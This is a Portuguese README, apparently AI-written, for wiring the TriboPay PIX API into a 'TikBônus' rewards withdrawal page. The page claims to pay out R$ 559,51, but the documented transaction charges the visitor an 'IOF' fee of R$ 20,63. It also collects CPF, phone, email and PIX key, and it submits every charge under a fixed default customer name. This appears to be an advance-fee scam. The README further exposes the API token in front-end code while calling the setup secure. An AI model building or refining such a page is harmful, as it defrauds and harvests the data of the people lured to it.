# 🔧 Configuração da Integração PIX TriboPay

## ⚡ Integração Implementada com Sucesso!

A página de saque (`saque/index.html`) agora está totalmente integrada com a API PIX da TriboPay. Todos os recursos foram implementados:

✅ **Formulário completo** com campos obrigatórios
✅ **Validações de dados** (CPF, email, telefone)
✅ **Integração com API TriboPay**
✅ **Exibição de QR Code PIX**
✅ **Interface de feedback** para usuário
✅ **Tratamento de erros**

---

## 🚨 CONFIGURAÇÕES OBRIGATÓRIAS

### 1. Token da API TriboPay

No arquivo `saque/index.html`, localize a seção:

```javascript
const TRIBOPAY_CONFIG = {
    apiToken: 'SEU_TOKEN_AQUI', // ⚠️ SUBSTITUA AQUI
    // ...
};
```

**SUBSTITUA** `SEU_TOKEN_AQUI` pelo seu token real da TriboPay.

### 2. Hash da Oferta (Offer Hash)

```javascript
offerHash: 'SEU_OFFER_HASH_AQUI', // ⚠️ SUBSTITUA AQUI
```

**SUBSTITUA** `SEU_OFFER_HASH_AQUI` pelo hash da oferta criada na TriboPay.

### 3. Hash do Produto (Product Hash)

```javascript
productHash: 'SEU_PRODUCT_HASH_AQUI' // ⚠️ SUBSTITUA AQUI
```

**SUBSTITUA** `SEU_PRODUCT_HASH_AQUI` pelo hash do produto criado na TriboPay.

---

## 📝 Como Obter os Hashes Necessários

### Criando um Produto na TriboPay

Use a API para criar um produto:

```bash
curl -X POST "https://api.tribopay.com.br/api/public/v1/products?api_token=SEU_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Saque TikBônus - Recompensas",
    "payment_type": 1,
    "product_type": "digital",
    "delivery_type": 1,
    "id_category": 1,
    "amount": 55951
  }'
```

### Criando uma Oferta

```bash
curl -X POST "https://api.tribopay.com.br/api/public/v1/products/{PRODUCT_HASH}/offers?api_token=SEU_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Saque PIX R$ 559,51",
    "amount": 55951
  }'
```

---

## 🎯 Recursos Implementados

### 📋 Formulário de Saque
- **Nome completo** (obrigatório, mín. 3 caracteres)
- **Email** (validação de formato)
- **Telefone** (apenas números, 10-11 dígitos)
- **CPF** (validação completa com dígitos verificadores)
- **Chave PIX** (obrigatório)

### ✅ Validações
- **CPF**: Validação completa incluindo dígitos verificadores
- **Email**: Verificação de formato válido
- **Telefone**: Aceita apenas números, 10 ou 11 dígitos
- **Campos obrigatórios**: Todos os campos são validados

### 🔄 Integração API
- **Endpoint**: `POST /transactions`
- **Método**: PIX
- **Valor**: R$ 559,51 (55951 centavos)

### Campos obrigatórios do corpo da transação

Para que a API aceite o pagamento PIX, envie todos os campos documentados no endpoint `/transactions`:

```json
{
  "amount": 2063,
  "offer_hash": "SEU_OFFER_HASH",
  "payment_method": "pix",
  "currency": "BRL",
  "customer": {
    "name": "João Silva",
    "email": "joao@email.com",
    "phone_number": "21999999999",
    "document": "09115751031"
  },
  "cart": [
    {
      "product_hash": "SEU_PRODUCT_HASH",
      "title": "IOF - Imposto sobre Operações Financeiras",
      "price": 2063,
      "quantity": 1,
      "operation_type": 1,
      "tangible": false
    }
  ],
  "installments": 1,
  "expire_in_days": 1,
  "transaction_origin": "api"
}
```

> 💡 Envie **sempre** os valores em centavos (`integer`) e utilize `phone_number` dentro do objeto `customer`. A ausência desses campos faz com que a API retorne o erro *"O valor da compra precisa ser no mínimo 5 reais"* mesmo quando o valor está correto.

- O front-end envia sempre o cliente padrão `Rafaela Almeida` (`rafaela.almeida414@hotmail.com`), mantendo consistência com a configuração solicitada.
- Caso a API retorne apenas o código copia-e-cola, o QR Code é renderizado automaticamente usando o serviço público de QR do Google Charts.
- **Timeout**: Configurado adequadamente
- **Error handling**: Tratamento completo de erros

### 🎨 Interface de Usuário
- **Loading state**: Botão mostra "Processando..." durante requisição
- **Mensagens**: Feedback visual para sucesso/erro/info
- **Modal PIX**: Popup com QR Code e código para copiar
- **Responsivo**: Funciona em dispositivos móveis

### 📱 QR Code PIX
- **Exibição automática**: Após criação da transação
- **Código copiável**: Botão para copiar código PIX
- **Informações da transação**: Hash e status
- **Modal interativo**: Pode ser fechado clicando fora

---

## 🧪 Como Testar

1. **Configure os tokens** conforme instruções acima
2. **Abra** `saque/index.html` no navegador
3. **Preencha** o formulário com dados válidos:
   - Nome: "João Silva"
   - Email: "joao@email.com"
   - Telefone: "21999999999"
   - CPF: "09115751031" (CPF válido para teste)
   - Chave PIX: Qualquer chave válida
4. **Clique** em "Realizar Saque PIX"
5. **Aguarde** o processamento
6. **Visualize** o QR Code PIX gerado

---

## 🛡️ Segurança

### Validações Implementadas:
- ✅ Validação de CPF com algoritmo oficial
- ✅ Sanitização de dados (remove caracteres especiais)
- ✅ Validação de email com regex
- ✅ Verificação de campos obrigatórios
- ✅ Escape de caracteres especiais em strings

### Headers de Segurança:
- ✅ Content-Type: application/json
- ✅ Accept: application/json
- ✅ Token de autenticação via query parameter

---

## 🔧 Estrutura do Código

### Configuração
```javascript
const TRIBOPAY_CONFIG = {
    apiToken: 'SEU_TOKEN_AQUI',
    baseUrl: 'https://api.tribopay.com.br/api/public/v1',
    offerHash: 'SEU_OFFER_HASH_AQUI',
    productHash: 'SEU_PRODUCT_HASH_AQUI'
};
```

### Funções Principais
- `validateCPF()` - Validação completa de CPF
- `validateEmail()` - Validação de formato de email
- `validatePhone()` - Validação de telefone
- `showMessage()` - Exibição de mensagens
- `showPixQRCode()` - Modal com QR Code
- `createPixTransaction()` - Integração com API

---

## 📞 Suporte

Se você encontrar algum problema:

1. **Verifique os tokens** - Certifique-se de que estão corretos
2. **Console do navegador** - Verifique se há erros JavaScript
3. **Network tab** - Analise as requisições HTTP
4. **Documentação TriboPay** - Consulte a documentação oficial

---

## ✨ Próximos Passos

A integração está **COMPLETA e FUNCIONAL**. Você precisa apenas:

1. ⚠️ **Configurar os tokens** (apiToken, offerHash, productHash)
2. 🧪 **Testar** a integração
3. 🚀 **Colocar em produção**

**A página de saque agora oferece uma experiência completa de saque PIX integrada com TriboPay!**
